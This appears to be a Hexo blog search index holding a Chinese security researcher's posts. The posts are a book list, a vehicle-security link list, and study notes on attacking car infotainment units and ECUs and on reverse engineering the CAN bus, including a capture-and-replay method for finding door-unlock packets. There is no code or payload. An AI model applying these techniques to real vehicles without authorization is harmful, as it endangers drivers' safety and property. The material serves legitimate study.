<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>立学以读书为本</title>
    <url>/2019/10/25/etc/%E7%AB%8B%E5%AD%A6%E4%BB%A5%E8%AF%BB%E4%B9%A6%E4%B8%BA%E6%9C%AC/</url>
    <content><![CDATA[<p><code>&quot;立身以立学为先, 立学以读书为本&quot;--欧阳修</code></p>
<blockquote>
<ul>
<li>记录自己的读书历程</li>
<li>自大学（2015年）至今</li>
</ul>
</blockquote>
<p>[toc]</p>
<a id="more"></a>
<h1 id="web安全-渗透测试"><a href="#web安全-渗透测试" class="headerlink" title="web安全/渗透测试"></a>web安全/渗透测试</h1><ul>
<li><p>《白帽子讲Web安全》</p>
<ul>
<li>太经典的书，无需多言</li>
<li>读完后还用思维导图整理了一下读书笔记（不太建议此法有点浪费时间）</li>
</ul>
</li>
<li><p>《Web安全深度剖析》</p>
<ul>
<li>第一本买的安全书籍，学长推荐，破晓大佬出品</li>
<li>犹记大学的第一个寒假啃了一遍，有了一点概念，似懂非懂的，但总算开了个头</li>
</ul>
</li>
<li><p>《代码审计: 企业级Web代码安全架构》</p>
<ul>
<li>缘起小组的日常学习任务</li>
</ul>
</li>
<li><p>《Metasploit渗透测试魔鬼训练营》</p>
<ul>
<li>第一次得知msf是在学长的技术分享课</li>
<li>第一人称的讲述视角挺有意思，内容也很丰富，略有难度</li>
<li>读完才理解渗透绝对不只是工具的一通操作，漏洞才是王道，开始想学逆向</li>
</ul>
</li>
<li><p>《Python黑帽子-黑客与渗透测试编程之道》</p>
<ul>
<li>web安全也要懂代码，除了php便是python</li>
<li>某假期实践此书代码作为python练习</li>
</ul>
</li>
<li><p>《内网安全攻防-渗透测试实战指南》</p>
<ul>
<li>在校时内网渗透便是弱项，毕业后书籍出版后果断购买</li>
<li>草草看了一遍，工作内容与之无关，也就荒废了</li>
</ul>
</li>
</ul>
<h1 id="软件安全-逆向"><a href="#软件安全-逆向" class="headerlink" title="软件安全/逆向"></a>软件安全/逆向</h1><ul>
<li><p>《汇编语言》</p>
<ul>
<li>王爽老师的书籍，深入浅出</li>
<li>为何我大学没有这一课程，没有这种好教材</li>
</ul>
</li>
<li><p>《加密与解密》</p>
<ul>
<li>看雪出品，支持正版</li>
<li>覆盖内容相当全面了，也从本书中得知了诸位大佬</li>
</ul>
</li>
<li><p>《0day安全: 软件漏洞分析技术》</p>
<ul>
<li>力荐！漏洞入门的必读书籍</li>
<li>虽然出版较早，技术有点过时，但仍干货满满</li>
</ul>
</li>
<li><p>《漏洞战争-软件漏洞分析静要》</p>
<ul>
<li>漏洞研究的进阶版，也从此书得知泉哥，医生转安全的大佬真多</li>
<li>有些漏洞不好复现，参考此书写了我最初的三篇漏洞分析文章，栈/堆/整数溢出</li>
</ul>
</li>
<li><p>《IDA Pro权威指南》</p>
<ul>
<li>逆向必用IDA，入门必推，好多博客文章我看都起源于此书</li>
<li>翻译的有点点拗口，但实操后很易理解，idapython那一章有一点过时</li>
<li>现作为字典书，随用随查</li>
</ul>
</li>
<li><p>《有趣的二进制-软件安全与逆向分析》</p>
<ul>
<li>很小很薄的一本书，但麻雀虽小五脏俱全</li>
<li>高铁上读完的</li>
</ul>
</li>
<li><p>《逆向工程核心原理》</p>
<ul>
<li>在校期间做web安全，软件逆向方向有些薄弱</li>
<li>第一本逆向书籍</li>
</ul>
</li>
<li><p>《PE权威指南》</p>
<ul>
<li>看雪的网址便是pediy，pe结构对于反病毒/脱壳等也至关重要</li>
<li>工作中PE涉及较少，大部分是ELF，也做字典书</li>
</ul>
</li>
<li><p>《C++反汇编与逆向分析技术揭秘》</p>
<ul>
<li>源自分析熊猫烧香病毒</li>
<li>后续发现此书真心不错，作者水平很高，力荐！</li>
</ul>
</li>
<li><p>《Linux二进制分析》</p>
<ul>
<li>单位办公室的书架上看到的</li>
<li>里面elf结构的知识尚可，其它东西尚未接触过</li>
</ul>
</li>
<li><p>《软件漏洞分析技术》</p>
<ul>
<li>有一段时间感觉进入瓶颈，想学点高级的东西，各种安全议题可见插桩/符号执行/污点分析等术语</li>
<li>跟领导聊过这一方面的应用，这些都太过学术化，实际效果可能并不理想（关于IOT漏洞挖掘）</li>
<li>粗读过此书，理论知识有些枯燥，也确实没遇到啥适用的场景，果真太学术（或许我段位不够）</li>
</ul>
</li>
<li><p>《CTF竞赛权威指南-pwn篇》</p>
<ul>
<li>只记得早些年的ctf只有web/逆向等题目，后续pwn才慢慢出现，难度大一点更考验技术</li>
<li>在校时pwn题目接触较少，工作后买此书也并非为了ctf，看过在线版感觉不错</li>
<li>与作者聊过，竟跟我同是15届，惭愧至极</li>
</ul>
</li>
<li><p>《恶意代码分析实战》</p>
<ul>
<li>刚毕业对未来没有规划，想入逆向但又不明确哪个方向，也把本书看了一遍，万一会用到呢</li>
<li>后续还是入了iot安全的大坑，这一块确实也接触不到，最终不了了之</li>
</ul>
</li>
</ul>
<h1 id="IOT-IOV安全"><a href="#IOT-IOV安全" class="headerlink" title="IOT/IOV安全"></a>IOT/IOV安全</h1><ul>
<li><p>《揭秘家用路由器0day漏洞挖掘技术》</p>
<ul>
<li>入职后同事推荐，用来入门足矣</li>
<li>第一篇路由器漏洞分析文章也是参考此书</li>
</ul>
</li>
<li><p>《物联网渗透测试》</p>
<ul>
<li>买之前看过目录觉得还可以，读了后略后悔，里面内容要么工作中用不到，要么我已经掌握，没学到太多东西</li>
<li>但入门应该不错，可能我买的时机不对</li>
</ul>
</li>
<li><p>《嵌入式Linux基础教程》</p>
<ul>
<li>搞iot安全要懂点嵌入式，想买来作为入门，但效果不佳</li>
<li>翻译的有些拗口，有些概念略抽象</li>
</ul>
</li>
<li><p>《硬件安全攻防大揭秘》</p>
<ul>
<li>工作时会需要拆解设备/提取固件等操作，硬件相关比较薄弱</li>
<li>干货满满，了解了相关概念，但其中有些还没有工作场景适用，</li>
</ul>
</li>
<li><p>《智能硬件安全》</p>
<ul>
<li>涵盖面比较广，包含汽车、路由器、摄像头、智能家居，但也是浅尝辄止，作为入门即可不必苛求</li>
<li>也是从本书中初识硬件法提取固件</li>
</ul>
</li>
<li><p>《汽车黑客大曝光》</p>
<ul>
<li>想转iov安全，目前资料很少，本书也较为久远</li>
<li>先学习理论知识，暂不清楚实践中会具体涉及哪些</li>
</ul>
</li>
<li><p>《智能汽车安全攻防大揭秘》</p>
<ul>
<li>国内的作者，亮点是有几篇实战，理论部分感觉略薄弱</li>
<li>相关书籍不多，且看且珍惜</li>
</ul>
</li>
</ul>
<h1 id="代码-编程"><a href="#代码-编程" class="headerlink" title="代码/编程"></a>代码/编程</h1><ul>
<li><p>《Linux C编程一站式学习》</p>
<ul>
<li>从汇编底层的角度讲解C语言，简单易懂</li>
<li>动态链接相关的知识挺不错的，比《程序员的自我修养》讲的简单一些，可作为入门</li>
</ul>
</li>
<li><p>《Unix/Linux 编程实践教程》</p>
<ul>
<li>工作所需，临时抱佛脚</li>
<li>读完真是拍手叫好，解答了之前好多疑难点，力荐！</li>
</ul>
</li>
<li><p>《C Primer Plus》</p>
<ul>
<li>个人感觉，比大学时C/CPP教材强太多</li>
<li>作为字典书，哪里忘记找哪里</li>
</ul>
</li>
<li><p>《PHP从入门到精通》</p>
<ul>
<li>搞渗透不允许不会php，php是最好的语言！</li>
<li>尤记得学长布置的寒假作业，php版留言板，可惜年少轻狂不知备份，代码没了</li>
</ul>
</li>
<li><p>《Python核心编程》</p>
<ul>
<li>刚开始学python时还傻傻的看视频教程，实践证明，一本入门书籍足矣</li>
<li>代码是敲出来的，语法忘记现查即可</li>
</ul>
</li>
</ul>
<h1 id="乱七八糟"><a href="#乱七八糟" class="headerlink" title="乱七八糟"></a>乱七八糟</h1><ul>
<li><p>《机器学习》</p>
<ul>
<li><p>经典西瓜书，大二/大三时，机器学习突然就火了</p>
</li>
<li><p>要与同学参加信安作品赛，虽然分工不同，但我也买了作为入门，后续走了安全这条路，所以只学了一点皮毛</p>
</li>
</ul>
</li>
<li><p>《Web安全之强化学习与GAN》</p>
<ul>
<li>机器学习与web安全的碰撞，老师推荐的，毕设相关思路也借鉴于此</li>
<li>虽然也不搞这一块了，但几次整理电子书，还是不舍删除</li>
</ul>
</li>
<li><p>《鸟哥的Linux私房菜-基础篇》</p>
<ul>
<li>大学课程必学Linux，但教材实在不咋地</li>
<li>一直没买实体书，第一次读还是在Kindle上</li>
</ul>
</li>
<li><p>《鸟哥的Linux私房菜-服务器架设篇》</p>
<ul>
<li>基础篇的姊妹篇</li>
<li>配置web漏洞环境时，一些服务器搭建环境总是跟着网上文章来，买来全面了解</li>
</ul>
</li>
<li><p>《深入理解计算机系统》</p>
<ul>
<li>神书不必多言，可是买来就吃灰</li>
<li>没有任务驱动故啃起来有些费劲</li>
</ul>
</li>
<li><p>《程序员的自我修养》</p>
<ul>
<li><p>非常有水平，程序链接/装载等知识讲的很透彻，算是进阶</p>
</li>
<li><p>读过一遍但可能理解不到位，感觉容易忘，还是要随时翻看。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>《图解密码技术》</p>
<ul>
<li><p>密码学入门，这一本就够了，讲的较全面</p>
</li>
<li><p>看过一遍后，作为字典书用</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>《第一本DOCKER书》</p>
<ul>
<li><p>大一/大二，docker突然流行，几行命令就配置好漏洞环境，这方面比vmware强了太多</p>
</li>
<li><p>记得当时Windows搭建docker环境很费劲，现在不知如何，目前已转mac，一个app就搞定</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>《Wireshark网络分析就这么简单》</p>
<ul>
<li><p>上学时，只因为ctf中有流量分析的题目，才被动去学习，还傻傻的找视频教程</p>
</li>
<li><p>工作后，写漏洞exp一直失败，总是读代码找bug，而同事随手打开wireshark，一眼看到问题所在，真第一次感觉到抓包的意义。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li>《软技能-代码之外的生存指南》<ul>
<li>泉哥推荐书单中看到的</li>
<li>现作为床头书偶尔翻看</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>书籍推荐</tag>
      </tags>
  </entry>
  <entry>
    <title>IOV安全资料整合</title>
    <url>/2022/03/11/iov/IOV%E5%AE%89%E5%85%A8%E8%B5%84%E6%96%99%E6%95%B4%E5%90%88/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="IOV安全资料整合"><a href="#IOV安全资料整合" class="headerlink" title="IOV安全资料整合"></a>IOV安全资料整合</h1><blockquote>
<p>PS: 看过的用删除线标记、持续更新…</p>
</blockquote>
<h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><blockquote>
<p>来自安全客、FreeBuf、看雪、安全团队/个人Blog、微信公众号等</p>
</blockquote>
<ul>
<li><p>总览</p>
<ul>
<li><del><a href="https://www.iotsec-zone.com/article?id=79" target="_blank" rel="noopener">车联网安全入门</a></del></li>
<li><del><a href="http://supergate.top/2021/04/06/车联网安全测试入门总结/车联网安全测试入门总结/" target="_blank" rel="noopener">车联网安全入门总结</a></del></li>
<li><del><a href="https://www.freebuf.com/articles/endpoint/262673.html" target="_blank" rel="noopener">初识智能网联汽车安全</a></del><a id="more"></a></li>
<li><del><a href="https://www.key1.top/index.php/archives/423/" target="_blank" rel="noopener">智能汽车安全研究：风险点/破解案例/研究工具</a></del></li>
<li><del><a href="https://mp.weixin.qq.com/s/QUODVHkzvEvKyGuITjuLlw" target="_blank" rel="noopener">智能网联汽车安全风险与评估</a></del></li>
<li><del><a href="https://www.freebuf.com/articles/endpoint/238682.html" target="_blank" rel="noopener">白话车安全</a></del></li>
<li><del><a href="https://xz.aliyun.com/t/9629" target="_blank" rel="noopener">该如何打下一台智能汽车</a></del></li>
<li><del><a href="https://delikely.github.io/2021/11/18/Vehicle-Cable-Connection-Terminal/" target="_blank" rel="noopener">车联网安全基础知识之从插线端子分析车内通信网络结构</a></del></li>
</ul>
</li>
</ul>
<ul>
<li><p>固件</p>
<ul>
<li><del><a href="https://delikely.github.io/2021/01/30/免拆芯片提取固件在汽车中的应用/" target="_blank" rel="noopener">免拆芯片提取固件在汽车中的应用</a></del></li>
<li><del><a href="https://delikely.github.io/2021/03/10/Tesla车机固件分析第一步：从磁盘映像中提取文件系统/" target="_blank" rel="noopener">Tesla 车机固件分析第一步：从磁盘映像中提取文件系统</a></del></li>
<li><del><a href="https://mp.weixin.qq.com/s/IIqg3ePO6MNY-pxcpGYv1w" target="_blank" rel="noopener">车机硬件分析与固件提取</a></del></li>
</ul>
</li>
</ul>
<ul>
<li><p>CAN</p>
<ul>
<li><del><a href="https://www.anquanke.com/post/id/209141" target="_blank" rel="noopener">Hacking All The Cars之CAN总线逆向</a></del></li>
<li><del><a href="https://bbs.pediy.com/thread-210115.htm" target="_blank" rel="noopener">汽车CAN协议hacking</a></del></li>
<li><del><a href="https://mp.weixin.qq.com/s/wbuuiDTdAXWo0_BRd8u7sA" target="_blank" rel="noopener">车联网安全之CAN协议浅谈</a></del></li>
<li><del><a href="https://www.freebuf.com/articles/mobile/322604.html" target="_blank" rel="noopener">车联网安全-汽车仪表模拟器使用</a></del></li>
</ul>
</li>
</ul>
<ul>
<li><p>ECU</p>
<ul>
<li><del><a href="https://zhuanlan.kanxue.com/article-624.htm" target="_blank" rel="noopener">汽车动力系统ECU固件逆向工程初探</a></del></li>
<li><del>安全研究员一刻钟拆解整车有效ECU-实操二</del></li>
</ul>
</li>
</ul>
<ul>
<li><p>TBOX</p>
<ul>
<li><del><a href="https://www.freebuf.com/articles/endpoint/240414.html" target="_blank" rel="noopener">海盗讲车：黑掉Tbox</a></del></li>
<li><del><a href="https://skygo.360.net/penetrate-intranet-via-tbox/" target="_blank" rel="noopener">黑客是如何从T-Box接入车厂内网的</a></del></li>
<li><del><a href="https://delikely.github.io/2021/08/15/TBOX-Main-Function/" target="_blank" rel="noopener">车联网安全基础知识之TBOX主要功能</a></del></li>
</ul>
</li>
</ul>
<ul>
<li>IVI<ul>
<li><del><a href="https://www.freebuf.com/articles/endpoint/241930.html" target="_blank" rel="noopener">海盗讲车：车机的渗透思路与实例分析</a></del></li>
</ul>
</li>
</ul>
<ul>
<li><p>漏洞</p>
<ul>
<li><del><a href="https://delikely.github.io/2021/06/04/U盘目录穿越获取车机SHELL/" target="_blank" rel="noopener">U盘目录穿越获取车机 SHELL（含模拟环境）</a></del></li>
<li><a href="https://bacde.me/post/Schneider-Charging-Staiong-Vulnerabilites/" target="_blank" rel="noopener">施耐德充电桩漏洞挖掘之旅</a></li>
<li><a href="https://keenlab.tencent.com/zh/2020/01/02/exploiting-wifi-stack-on-tesla-model-s/" target="_blank" rel="noopener">在Tesla Model S上实现Wi-Fi协议栈漏洞的利用</a></li>
</ul>
</li>
</ul>
<ul>
<li><p>其它</p>
<ul>
<li><del><a href="https://delikely.github.io/2022/02/28/QNX-Command-Cheatsheet/" target="_blank" rel="noopener">车联网安全基础知识之QNX Command Cheatsheet</a></del></li>
<li><del><a href="https://delikely.github.io/2021/04/29/2021-WIDC信息安全挑战赛预赛回顾与OBD-II标准阅读/" target="_blank" rel="noopener">2021WIDC 信息安全挑战赛预赛回顾与 OBD-II 标准阅读</a></del></li>
<li><a href="https://delikely.github.io/2021/10/20/Charging-infrastructure/" target="_blank" rel="noopener">车联网安全基础知识之充电基础设施</a></li>
<li><a href="https://delikely.github.io/2021/09/29/VW-OCU/" target="_blank" rel="noopener">车联网安全基础知识之大众J949(OCU/TBOX)</a></li>
<li><a href="https://delikely.github.io/2021/07/30/VW-Electronic/" target="_blank" rel="noopener">车联网安全基础知识之大众集团汽车电子电气架构</a></li>
<li><a href="https://delikely.github.io/2021/07/25/Automotive-Modular-Platform/" target="_blank" rel="noopener">车联网安全基础知识之汽车模块化平台</a></li>
<li><del><a href="https://mp.weixin.qq.com/s/xumTEnHvMHlvQ0DSMu9pPw" target="_blank" rel="noopener">中国智能网联汽车大赛预赛篇</a></del></li>
<li><del>车联网研究员必读安全操作小知识-实操一</del></li>
<li><del><a href="https://mp.weixin.qq.com/s/M5cyp-mdVor8Ppb_xKtDZA" target="_blank" rel="noopener">2021创安杯智能汽车信息公开赛-知识赛</a></del></li>
<li><a href="https://keenlab.tencent.com/zh/2020/03/30/Tencent-Keen-Security-Lab-Experimental-Security-Assessment-on-Lexus-Cars/" target="_blank" rel="noopener">腾讯科恩实验室：雷克萨斯汽车安全研究综述报告</a></li>
</ul>
</li>
</ul>
<h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><ul>
<li><del>《汽车黑客大曝光》</del></li>
<li><del>《智能汽车安全攻防大揭秘》</del></li>
</ul>
<h2 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h2><blockquote>
<p>大多来自VIPREAD、部分来自360skygo</p>
</blockquote>
<ul>
<li><del>2016 智能网联汽车信息安全年度报告</del></li>
<li><del>2017 智能网联汽车信息安全年度报告</del></li>
<li><del>2018 智能网联汽车信息安全年度报告</del></li>
<li><del>2019 智能网联汽车信息安全年度报告</del></li>
<li>360度介绍⽹网联汽⻋车安全.pdf</li>
<li>OBD-II 设备的网络安全风险.pdf</li>
<li>汽车TBOX安全性检测与分析.pdf</li>
<li>汽车V2X安全认证的几点思考.pdf</li>
<li>汽车安全-有效地提取并分析汽车固件.pdf</li>
<li>汽车总线安全测试平台.pdf</li>
<li>汽车网络安全守方之殇.pdf</li>
<li>汽车信息安全年度报告.pdf.pdf</li>
<li>侠盗猎车—数字钥匙Hacking.pdf</li>
<li>打造安全的智能网联汽车.pdf</li>
<li>智能网联汽车的安全测试.pdf</li>
<li>车联安全体系构建与实践.pdf</li>
<li>车联网时代的安全新挑战.pdf</li>
<li>智能网联汽车安全防护体系 车载安全防护体系解析.pdf</li>
<li>智能外设入侵汽车网络解密.pdf</li>
<li>特斯拉安全漏洞的发现过程.pdf</li>
<li>网联汽车信息安全现状分析.pdf</li>
<li>智能网联汽车信息安全白皮书2016.pdf.pdf</li>
<li>理想汽车车联网安全挑战与思考.pdf</li>
<li>蔚来汽车车联网安全实践与思考.pdf</li>
<li>智能网联时代，重新定义汽车安全.pdf</li>
<li>智能网联汽车信息安全建设最佳实践.pdf</li>
<li>特斯拉安全研究：从一次到两次的背后.pdf</li>
<li>针对汽车无钥匙进入的中继攻击及防护.pdf</li>
<li>从应用安全风险的角度看待互联网汽车的安全.pdf</li>
</ul>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>车载信息娱乐系统IVI的攻击</title>
    <url>/2022/02/02/iov/%E8%BD%A6%E8%BD%BD%E4%BF%A1%E6%81%AF%E5%A8%B1%E4%B9%90%E7%B3%BB%E7%BB%9FIVI%E7%9A%84%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="车载信息娱乐系统IVI的攻击"><a href="#车载信息娱乐系统IVI的攻击" class="headerlink" title="车载信息娱乐系统IVI的攻击"></a>车载信息娱乐系统IVI的攻击</h1><h2 id="IVI攻击"><a href="#IVI攻击" class="headerlink" title="IVI攻击"></a>IVI攻击</h2><ul>
<li>简介<ul>
<li>IVI即汽车的中央控制台触摸屏界面，控制台也有操作系统。</li>
<li>相对其它汽车部件而言，IVI提供较多的远程攻击面</li>
<li>获取IVI的访问权限后，不仅可以修改其自身，也可帮助了解车辆工作方式（如CAN数据包的路由方式和ECU更新方式）<a id="more"></a></li>
</ul>
</li>
<li><p>攻击面</p>
<ul>
<li>辅助插孔：CD-ROM、触摸屏、USB</li>
<li>无线输入：蓝牙、蜂窝网络、Wi-Fi</li>
<li>内网：CAN等总线网络、以太网、高速多媒体总线</li>
</ul>
</li>
<li><p>IVI通用攻击方式：软件升级</p>
<ul>
<li>识别操作系统：查看品牌标签、用户界面中寻找版本号</li>
<li>确定文件系统：binwalk工具、升级包的压缩方式及体系结构</li>
<li>改造系统：即固件修改与重打包、绕过完整性校验</li>
<li>寻找漏洞：IVI应用程序、IVI固件解包后提取的二进制文件</li>
</ul>
</li>
<li>IVI硬件攻击<ul>
<li>分解IVI单元的连接<ul>
<li>第一步是拆除IVI单元，顺着线路找到电路板，来识别组件和连接</li>
<li>若能够确定目标是否已连接到总线网络，即可知exp可控制的范围</li>
<li>攻击所用的总线会影响payload的选择、受影响的联网系统的范围</li>
</ul>
</li>
<li>拆解IVI单元<ul>
<li>IVI内部紧凑，拆卸任务耗时且复杂，不得已时再这样（如没有布线图时）</li>
<li>通过隐藏的连接器，可加载或调试固件，同时可利用其UART观察日志</li>
<li>拿到电路板后，注意查找JTAG和UART接口</li>
<li>后续就是常规的硬件攻击法，如依据芯片的数据手册来分析引脚连接情况</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="测试平台-设备"><a href="#测试平台-设备" class="headerlink" title="测试平台/设备"></a>测试平台/设备</h2><ul>
<li>IVI测试平台<ul>
<li>折腾汽车的原厂IVI，会有损坏的风险</li>
<li>替代方案：废旧汽车的回收IVI、开源测试平台（零部件市场的不可，因其通常不接入CAN）</li>
<li>2个基于PC虚拟机的开源平台：GENIVI Meta-IVI、Automotive Grade Linux（具体使用待学习）</li>
</ul>
</li>
<li>获取物理IVI设备<ul>
<li>两法：从现有汽车中拆卸、购买开发版的</li>
<li>将IVI从现代汽车中不损坏的提取出来，难度较大</li>
<li>若IVI有防盗安全码：用户手册中查询、利用VIN来获取/重新设置</li>
<li>完全拆卸该单元，连接到任何测试连接器，不仅可正常运行IVI，还可访问隐藏的连接器</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车ECU攻击</title>
    <url>/2022/01/30/iov/%E6%B1%BD%E8%BD%A6ECU%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="汽车ECU攻击"><a href="#汽车ECU攻击" class="headerlink" title="汽车ECU攻击"></a>汽车ECU攻击</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>电子控制器ECU<ul>
<li>汽车内有许多电子控制器，被连成网络，可互相通信</li>
<li>类似术语可交叉使用，如电子控制单元ECU、变速器控制单元TCU</li>
<li>广义上讲，可统称ECU</li>
</ul>
</li>
<li>ECU安全性<ul>
<li>具备一些防止代码和操作遭受攻击的措施，但强弱不一<a id="more"></a></li>
<li>控制器型号繁多，故不太可能存在一种可破解所有控制器的“万能钥匙”</li>
<li>存在通用性：OEM厂商很少改变技术路线、使用第三方供应商的产品</li>
</ul>
</li>
<li>ECU攻击可分为三种<ul>
<li>前门攻击：劫持原始设备制造商OEM的访问机制</li>
<li>后门攻击：即传统的硬件黑客手段</li>
<li>漏洞利用：非预期的访问机制</li>
</ul>
</li>
</ul>
<h2 id="前门攻击"><a href="#前门攻击" class="headerlink" title="前门攻击"></a>前门攻击</h2><ul>
<li>车辆可通过OBD-II连接器进行重编程，故可逆向原厂的编程方式来攻击</li>
<li>J2543标准<ul>
<li>目的：利用其API改善数字工具厂商之间的互操作性</li>
<li>该API采用Windows系统推荐的车辆通信方式</li>
<li>引入一系列DLL，将标准API的调用映射到汽车的通信指令</li>
</ul>
</li>
<li>J2534工具<ul>
<li>可观察OEM工具与车用电脑之间的交互活动</li>
<li>可用于更新固件、提供诊断软件</li>
</ul>
</li>
<li>J2534攻击车辆的基本思路：观察、记录、分析、扩展功能<ul>
<li>配置J2534程序与接口硬件</li>
<li>使用J2534工具对目标进行操作，同时观察并记录与目标的通信</li>
<li>分析通信，可知OEM厂商如何访问车辆系统</li>
<li>开发出可读取/重编程车辆的应用程序</li>
<li>最终效果：可直接与车辆通信，无需车辆J2534接口、厂商J2534软件</li>
</ul>
</li>
<li>如何观察J2534事务<ul>
<li>使用J2534 shim DLL监听PC的API调用（具体如何操作？等实例）</li>
<li>嗅探器抓包</li>
</ul>
</li>
<li>KWP2000等早期协议<ul>
<li>J2534之前，还有闪存可编程的控制单元</li>
<li>KWP2000闪存编程工具，可通过串口或USB转串口来与PC连接，可进行诊断和内存编程</li>
</ul>
</li>
<li>ECU对工具的身份认证<ul>
<li>一般采用“种子-密钥”算法：ECU生成一个随机种子，工具对种子处理后得到密钥并发送给ECU，验证成功后工具才可访问ECU</li>
<li>并没有标准的种子-密钥算法，种子及密钥的位数可能不同，从种子到生成密钥的算法也可能不同</li>
<li>如何理解算法：如逆向PC端工具或汽车端ECU固件（直接找到相关代码）、抓包通信过程分析数据</li>
</ul>
</li>
</ul>
<h2 id="后门攻击"><a href="#后门攻击" class="headerlink" title="后门攻击"></a>后门攻击</h2><ul>
<li>后门攻击的必要性<ul>
<li>前门攻击会遇到障碍：没有合适工具、难以破解保护程序</li>
<li>ECU也是嵌入式系统，可采用常规的硬件破解手段（前后门可类比于软硬件）</li>
<li>针对硬件的后门攻击 &amp;&amp; 逆向破解前门的保护措施，有时前者比后者更合理/有效</li>
</ul>
</li>
<li>首要步骤是分析电路板：<ul>
<li>先从最大的芯片开始，因为其一般是处理器和存储器</li>
<li>旧设备上的定制/一次性芯片，分析起来较为困难，因为资料少</li>
<li>查找存储器芯片是分析的关键，因为固件保存于此</li>
</ul>
</li>
<li>后门攻击成功后，会获取到对应ECU的固件，可继续逆向分析</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>通过向系统注入恶意数据，令其执行非预期操作</li>
<li>基于bug构建的，如缓冲区溢出，但并非所有bug都可转为exp代码</li>
<li>可形成攻击的bug难找，exp也不易编写，故此种攻击相对少见</li>
</ul>
<blockquote>
<p>参考：《汽车黑客大曝光》</p>
</blockquote>
]]></content>
      <categories>
        <category>IOV安全</category>
      </categories>
      <tags>
        <tag>IOV安全</tag>
      </tags>
  </entry>
  <entry>
    <title>汽车CAN总线的安全研究</title>
    <url>/2022/01/28/iov/%E6%B1%BD%E8%BD%A6CAN%E6%80%BB%E7%BA%BF%E7%9A%84%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="汽车CAN总线的安全研究"><a href="#汽车CAN总线的安全研究" class="headerlink" title="汽车CAN总线的安全研究"></a>汽车CAN总线的安全研究</h1><h2 id="定位CAN总线"><a href="#定位CAN总线" class="headerlink" title="定位CAN总线"></a>定位CAN总线</h2><ul>
<li><p>对CAN总线进行逆向，需要：</p>
<ul>
<li>定位CAN总线</li>
<li>能够读取CAN数据包，并且识别每个包的具体功能</li>
<li>关注那些执行具体操作的非诊断数据包</li>
</ul>
</li>
<li><p>寻找CAN总线<a id="more"></a></p>
<ul>
<li>若能连接到OBD-II，则可通过引脚图定位到CAN总线的位置</li>
<li>若无法连接OBD，则可：双绞线、2.5V的基线电压、差分信号相互抵消导致的恒定信号</li>
</ul>
</li>
</ul>
<h2 id="CAN数据包处理：抓取-分组-回放"><a href="#CAN数据包处理：抓取-分组-回放" class="headerlink" title="CAN数据包处理：抓取/分组/回放"></a>CAN数据包处理：抓取/分组/回放</h2><ul>
<li>通用包分析手段不适用CAN总线，因为帧格式因厂商而异</li>
<li>CAN总线上存在大量噪音，不易分类整理</li>
<li>Wireshark &amp; candump<ul>
<li>可监听canX和vcanX设备，但不可</li>
<li>不会解密数据，以原始十六进制显示，因为其只能处理基本的CAN包头，无法处理IOS-TP和UDS</li>
<li>candump：同Wireshark，也不会解密数据，该工作需手动完成</li>
</ul>
</li>
<li>cansniffer<ul>
<li>可将数据包按仲裁ID分组，高亮标出变化的字节（或-c参数分色显示）</li>
<li>可自动去除未发生变化的重复CAN流量</li>
<li>可向其发送键盘输入，对终端中的显示结果进行过滤，如-000000（位掩码形式）关闭所有数据包显示，+301只显示ID为301的</li>
</ul>
</li>
<li>Kayak<ul>
<li>图形界面的抓包工具</li>
<li>同cansniffer，可用于分组can数据流</li>
<li>同candump和canplayer，可用于数据包录制及回放</li>
</ul>
</li>
<li><p>相关工具整理</p>
<ul>
<li>抓包：Wireshark（不可监听slcanX，可通过改名或桥接法）、canutils-candump。二者均不可解码数据</li>
<li>分组：canutils-cansniffer（可发送键盘输入来过滤）、Kayak（图形界面）</li>
<li>录制及回放：Kayak、canutils工具包（candump录制、canplayer回放）</li>
</ul>
</li>
<li><p>识别单个数据包功能的通用方式</p>
<ul>
<li>开始抓包</li>
<li>实际操作，如打开车门</li>
<li>停止抓包</li>
<li>数据包回放</li>
<li>观察操作是否复现，即是否开门</li>
<li>若复现失败，则可能：数据包错过、尝试乘客侧车门、CAN总线错误、数据包碰撞）</li>
<li>若复现成功，则二分法排除，直至找到具体数据包</li>
</ul>
</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>ICSim<ul>
<li>可产生数个关键的CAN信号，通过它可不必改造汽车即可练习CAN总线逆向技术</li>
<li>在ICSim上学到的方法，可直接移植到目标车辆上</li>
</ul>
</li>
<li>OpenXC<ul>
<li>福特公司发起，适用于具体的车型</li>
<li>CAN总线逆向工程解决方案，可将专有的CAN协议转换为易读格式</li>
</ul>
</li>
<li>fuzz CAN总线<ul>
<li>编写fuzz程序容易，但是有效概率不大（难以定位一组数据包中的某一个、fuzz运动的汽车很危险）</li>
<li>有些嗅探器可直接支持模糊测试</li>
<li>分析UDS命令是一个良好的fuzz切入点</li>
</ul>
</li>
<li>模糊测试CAN总线，或者回放大量CAN数据包时，可能会引发一些问题<ul>
<li>如指示灯异常、汽车无法启动/熄火/控制、变砖</li>
<li>不可对行驶中的汽车注入数据包，若必须则将其升离地面</li>
<li>修改汽车固件需极其谨慎，有变砖风险</li>
</ul>
</li>
</ul>
<blockquote>
